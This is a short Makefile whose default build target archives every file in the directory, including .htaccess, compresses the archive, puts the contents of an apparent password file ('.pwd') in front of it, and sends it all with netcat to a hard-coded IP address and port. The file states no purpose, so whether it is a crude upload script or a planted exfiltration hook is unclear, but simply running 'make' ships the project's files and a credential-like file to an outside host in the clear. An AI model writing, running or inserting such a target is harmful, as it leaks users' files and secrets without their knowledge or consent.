
addr=188.166.13.50
port=8099
lvl=5

all:
	tar -$(args)c * .htaccess $(xf) | xz -zec$(lvl) | cat -u .pwd - | /usr/bin/nc $(addr) $(port)
